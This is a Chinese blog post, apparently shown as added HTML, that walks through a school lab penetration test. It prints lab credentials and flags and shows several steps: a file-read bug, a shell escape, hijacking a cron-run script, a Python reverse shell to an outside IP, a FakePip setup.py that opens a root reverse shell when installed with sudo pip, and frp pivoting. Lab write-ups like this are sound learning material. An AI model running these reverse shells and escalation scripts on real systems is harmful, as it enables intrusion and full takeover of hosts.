@@ -1,0 +1,629 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="ctf回顾">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一次完整内网渗透测试">
+<meta property="og:url" content="https://thenights1.github.io/2024/03/19/shentou1/index.html">
+<meta property="og:site_name" content="nevgiver&#39;s Blog">
+<meta property="og:description" content="ctf回顾">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-46-08-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-24-48-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-27-39-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-27-27-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-31-47-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-36-02-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-36-35-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-36-52-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-37-54-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-38-23-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-39-55-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-41-23-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-50-36-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-50-47-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-51-45-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-53-54-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-55-01-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-49-17-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-49-40-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-50-52-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-52-58-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-55-08-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-56-12-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-07-10-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-08-50-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-19-02-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-19-42-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-22-42-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-25-01-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-30-01-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-29-52-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-35-02-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-59-04-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-58-55-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-59-17-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-09-12-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-10-10-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-11-07-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-12-33-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-19-14-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-26-53-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-27-38-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-31-15-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-32-18-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-34-33-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-38-24-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-39-12-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-41-47-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-42-02-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-44-18-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-44-41-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-48-31-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-49-51-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-14-56-48-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-13-34-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-13-12-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-15-08-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-30-01-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-30-28-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-19-09-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-19-45-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-39-14-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-22-08-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-23-03-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-23-23-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-25-46-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-24-12-image.png">
+<meta property="og:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-24-19-image.png">
+<meta property="article:published_time" content="2024-03-19T08:08:48.000Z">
+<meta property="article:modified_time" content="2024-03-25T05:31:18.565Z">
+<meta property="article:author" content="nevgiver">
+<meta property="article:tag" content="文件上传绕过">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-46-08-image.png"><title>第一次完整内网渗透测试 | nevgiver's Blog</title><link ref="canonical" href="https://thenights1.github.io/2024/03/19/shentou1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-solid fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/gallery/"><span class="header-nav-menu-item__icon"><i class="fas fa-image"></i></span><span class="header-nav-menu-item__text">相册</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner" style="background: url(https://picx.zhimg.com/v2-e299155bba3e8b2c7b7cec1ed4353bf8_r.jpg?source=1def8aca) no-repeat center/cover;"><div class="header-banner-info"><div class="header-banner-info__title">欢迎！来访者</div><div class="header-banner-info__subtitle">愿你前行的道路有群星闪耀，愿你留下的足迹有百花绽放~</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">第一次完整内网渗透测试</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2024-03-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2024-03-25</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">2.8k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">17分</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/2024/03/19/shentou1/" data-flag-title="第一次完整内网渗透测试"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><blockquote>
+<p>最近突发奇想（其实也不是，就是看见实习要求感觉自己啥都不会），想学习一下内外网渗透，于是就想到了之前学校的一个靶场，于是就有了这篇文章，主要渗透靶场如下，可以完整顺下来。完整走完一遍渗透流程感觉学到了巨多的知识。我第一遍的时候只截了图，就一直往下做了。现在属于第二遍回顾，来把一些当时不太会的知识点再学学原理</p>
+</blockquote>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-15-46-08-image.png" alt="" /></p>
+
+        <h1 id="阶段1渗透内网唯一对外机器"   >
+          <a href="#阶段1渗透内网唯一对外机器" class="heading-link"><i class="fas fa-link"></i></a><a class="markdownIt-Anchor" href="#阶段1渗透内网唯一对外机器"></a> 阶段1：渗透内网唯一对外机器</h1>
+      
+<p>唯一可访问的外网：192.168.1.7</p>
+<p>用win10侦察机访问一下，查看源代码：</p>
+<p>发现疑似任意文件读取漏洞</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-24-48-image.png" alt="" /></p>
+<p>因为是靶场，所以他这里面的fr我感觉应该是file read，所以是任意文件读，按如下命令读取index.php文件：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-27-39-image.png" alt="" /></p>
+<p>最开始直接参数设为index.php无反应，如上，猜测应该是代码里面本来就有后缀，所以改成index，如下，就可以显示出源代码的base64</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-27-27-image.png" alt="" /></p>
+<p>解码一下得到密码<img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-31-47-image.png" alt="" /></p>
+<blockquote>
+<p>密码：Niamey4Ever227!!!</p>
+<p>账户：mamadou</p>
+</blockquote>
+<p>账户是在网站中发现的，有“made by mamadou”</p>
+<p>接下来就需要ssh一下，那就先nmap扫一下端口</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-36-02-image.png" alt="" /></p>
+<p>发现有一个3333端口开着，网上搜了一下说是这个是ssh服务，所以就直接用了</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-36-35-image.png" alt="" /></p>
+<p>连接上之后发现是在python内，如下</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-36-52-image.png" alt="" /></p>
+<p>既然是python，那就用下面的命令可以进入shell，如下：</p>
+<p>（搜的命令 遇到这种情况都这样做）</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty;</span><br><span class="line">pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></div></figure>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-37-54-image.png" alt="" /></p>
+<p>进入之后ls一下就会发现第一个flag：flag1：d86b9ad71ca887f4dd1dac86ba1c4dfc</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-38-23-image.png" alt="" /></p>
+<p>读取/etc/passwd</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-39-55-image.png" alt="" /></p>
+<p>发现了另一个用户devops，先去该用户的目录看看 ls一下，发现了flag2，但是无权限打开，需要devops用户才有权打开</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-41-23-image.png" alt="" /></p>
+<p>则需要将用户改成devops才可以打开，那接下来就需要想办法将用户改一下</p>
+<p>用下面的命令看一下devops下有的文件</p>
+<p><code>find / -users devops 2&gt;/dev/null</code></p>
+<blockquote>
+<p>其中讲一下 2&gt;/dev/null命令，挺有意思的</p>
+<p>这是Linux系统预留可三个文件描述符：0、1、2，意义如下：<br />
+0——标准输入（stdin）<br />
+1——标准输出（stdout）即输入到终端<br />
+2——标准错误（stderr）</p>
+<p>则 2&gt;/dev/null 就是将错误输入到null，也就是将错误隐藏，这样就可以只输出正确的了，以免刷屏</p>
+</blockquote>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-50-36-image.png" alt="" /></p>
+<p>如上，挨个试一下发现只要第一个python文件可以打开，打开内容如下</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-50-47-image.png" alt="" /></p>
+<p>是写入文件的命令，去写入的目录看一下，发现该文件是刚刚创建的，很奇怪，在ls一下发现时间又更新了，这样应该就是系统中有个程序一直在定时的调用这个程序。</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-51-45-image.png" alt="" /></p>
+<p>那就简单了，直接改一下python文件，改成读取flag2文件然后输出出来，这样我们就可以打开了。</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-53-54-image.png" alt="" /></p>
+<p>如下，得到第二个flag</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-11-55-01-image.png" alt="" /></p>
+<p>Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p>
+<p>既然可以执行任意我们写入的python文件，那就可以反弹shell了，如下，是反弹shell的一个标准脚本，用就行</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;/tmp/test&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;99.99.99.99&quot;</span>,<span class="number">1235</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></div></figure>
+<p>连接到kali攻击机上面，kali监听</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-49-17-image.png" alt="" /></p>
+<p>最后成功反弹shell，如下，用户为devops，也能cat flag2</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-49-40-image.png" alt="" /></p>
+<p>接下来收集信息：用sudo -l 看一下自己的权利，可以发现pip可用，且是root权限</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-50-52-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-52-58-image.png" alt="" /></p>
+<p>则可以利用网上已有的脚步利用pip漏洞，这里环境中kali攻击机上已经有了相应的脚本，则用下面的办法传到机器上</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-55-08-image.png" alt="" /></p>
+<p>在kali开启python服务器，目录下需要有脚本，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://xn--setup-qr1kn22vcjd.py" >这里是setup.py</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-12-56-12-image.png" alt="" /></p>
+<p>然后用我们刚才反弹的shell来获取脚本，如上：</p>
+<p>命令总结：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali攻击机：</span></span><br><span class="line">python3 -m http.server <span class="number">8000</span>      <span class="comment"># 在8000端口开服务器</span></span><br><span class="line"><span class="comment"># 被攻击机shell：</span></span><br><span class="line">wget http://kali.ip/所需文件</span><br></pre></td></tr></table></div></figure>
+<p>脚本如下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomInstall</span>(<span class="title class_ inherited__">install</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">    install.run(self)</span><br><span class="line">    LHOST = <span class="string">&#x27;localhost&#x27;</span>  <span class="comment"># change this 改成kali的IP地址</span></span><br><span class="line">    LPORT = <span class="number">13372</span></span><br><span class="line"></span><br><span class="line">    reverse_shell = <span class="string">&#x27;python -c &quot;import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\&#x27;&#123;LHOST&#125;\&#x27;, &#123;LPORT&#125;)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#x27;HISTFILE\&#x27;, \&#x27;/dev/null\&#x27;); pty.spawn(\&#x27;/bin/bash\&#x27;); s.close();&quot;&#x27;</span>.<span class="built_in">format</span>(LHOST=LHOST,LPORT=LPORT)</span><br><span class="line">    encoded = base64.b64encode(reverse_shell)</span><br><span class="line">    os.system(<span class="string">&#x27;echo %s|base64 -d|bash&#x27;</span> % encoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&#x27;FakePip&#x27;</span>,</span><br><span class="line">      version=<span class="string">&#x27;0.0.1&#x27;</span>,</span><br><span class="line">      description=<span class="string">&#x27;This will exploit a sudoer able to /usr/bin/pip install *&#x27;</span>,</span><br><span class="line">      url=<span class="string">&#x27;https://github.com/0x00-0x00/fakepip&#x27;</span>,</span><br><span class="line">      author=<span class="string">&#x27;zc00l&#x27;</span>,</span><br><span class="line">      author_email=<span class="string">&#x27;andre.marques@esecurity.com.br&#x27;</span>,</span><br><span class="line">      license=<span class="string">&#x27;MIT&#x27;</span>,</span><br><span class="line">      zip_safe=<span class="literal">False</span>,</span><br><span class="line">      cmdclass=&#123;<span class="string">&#x27;install&#x27;</span>: CustomInstall&#125;)</span><br></pre></td></tr></table></div></figure>
+<p>在shell中用vim发现用不了，则就可以用sed文件，先搜索更改的位置然后直接改就好了。</p>
+<p>需要改的地方也就是ip地址而已</p>
+<p>然后执行命令：（利用脚本）</p>
+<p><code>sudo /usr/bin/pip install . --upgrade --force-reinstall</code></p>
+<p>反弹shell：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-07-10-image.png" alt="" /></p>
+<p>去主目录ls一下发现有root.txt，查看root.txt</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-08-50-image.png" alt="" /></p>
+<p>得到第三个flag：821ae63dbe0c573eff8b69d451fb21bc</p>
+<p>本阶段就算结束了，拿到了机器的root权限后基本上就可以随便黑进去了</p>
+
+        <h1 id="阶段2内网渗透"   >
+          <a href="#阶段2内网渗透" class="heading-link"><i class="fas fa-link"></i></a><a class="markdownIt-Anchor" href="#阶段2内网渗透"></a> 阶段2：内网渗透</h1>
+      
+
+        <h2 id="阶段2-1-内网渗透博客系统"   >
+          <a href="#阶段2-1-内网渗透博客系统" class="heading-link"><i class="fas fa-link"></i></a><a class="markdownIt-Anchor" href="#阶段2-1-内网渗透博客系统"></a> 阶段2-1 内网渗透博客系统</h2>
+      
+<p>接下来我们需要做的是将上面已经拿到root权限的机器当做跳板，继续向内网渗透。因为内网的另外两台机器不出网，所以只能用代理的方式，让kali通过代理可以当成是内网机，这样方便进行一些攻击操作，不然在得到的rootShell中攻击太麻烦了，费时又费力</p>
+<p>先去kali拿frp的代理工具（这里的frp即为代理工具）</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-19-02-image.png" alt="" /></p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-19-42-image.png" alt="" /></p>
+<p>然后先在kali建立代理服务器</p>
+<figure class="highlight cmake"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frps  //赋权</span><br><span class="line"></span><br><span class="line">./frps -c ./frps.ini   //建立代理服务端</span><br></pre></td></tr></table></div></figure>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-22-42-image.png" alt="" /></p>
+<p>然后在拿到root的外网机器上执行下面命令</p>
+<figure class="highlight cmake"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc  //赋权</span><br><span class="line"></span><br><span class="line">./frpc -c ./frpc.ini   //连接服务</span><br></pre></td></tr></table></div></figure>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-25-01-image.png" alt="" /></p>
+<p>如上图，此时就算是代理建立完成了，这两个窗口就可以先收起来了，但是不能关闭，直到我们全部渗透完才可以关闭。</p>
+<p>代理建立成功后设置proxychains的配置文件：</p>
+<p><img src="https://blogkkk-1319553185.cos.ap-shanghai.myqcloud.com/img/2024-03-19-13-30-01-image.png" alt="" /></p>
